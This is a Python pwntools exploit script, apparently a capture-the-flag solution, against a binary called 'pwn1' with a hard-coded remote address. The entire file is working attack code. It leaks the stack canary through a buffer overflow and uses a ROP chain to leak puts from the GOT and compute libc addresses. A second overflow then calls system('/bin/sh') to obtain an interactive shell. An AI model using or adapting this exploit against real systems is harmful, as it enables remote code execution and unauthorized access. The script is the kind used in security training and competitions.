from pwn import *
import string
context.binary = './pwn1'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


libc = context.binary.libc
def dbg():
	raw_input()
if args['REMOTE']:
	p = remote('47.106.94.13', 50015)
	#libc = ELF('../x64_libc.so.6')
else:
	p = process('./pwn1')
	#gdb.attach(p, 'b* 0x400736')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x00000000004007f3 # pop rdi ; ret
main = 0x4006C6

#leak canary
payload = 'a'*0x40 + '+'*0x8 + '?'
p.recvline()
p.send(payload)

p.recvuntil('Your name ')
p.recvuntil('?')
canary = u64(p.recv(7).ljust(8, '\x00')) << 8
print "canary ==> " + hex(canary)
dbg()

payload = 'a'*0x48
payload += p64(canary) + 'a'*8
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(main)

p.recvuntil('real name?\n')
p.send(payload)
p.recvuntil('See you again!\n')

puts_addr = u64(p.recvline().strip('\x0a').ljust(8, '\x00'))
libc_base  = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))


#leak canary
payload = 'a'*0x40 + '+'*0x8 + '?'
p.recvline()
p.send(payload)

p.recvuntil('Your name ')
p.recvuntil('?')
canary = u64(p.recv(7).ljust(8, '\x00')) << 8

payload = 'a'*0x48
payload += p64(canary) + 'a'*8
payload += p64(pop_rdi) + p64(binsh) + p64(system_addr)
payload += p64(main)

p.recvuntil('real name?\n')
p.send(payload)


p.interactive()
p.close()

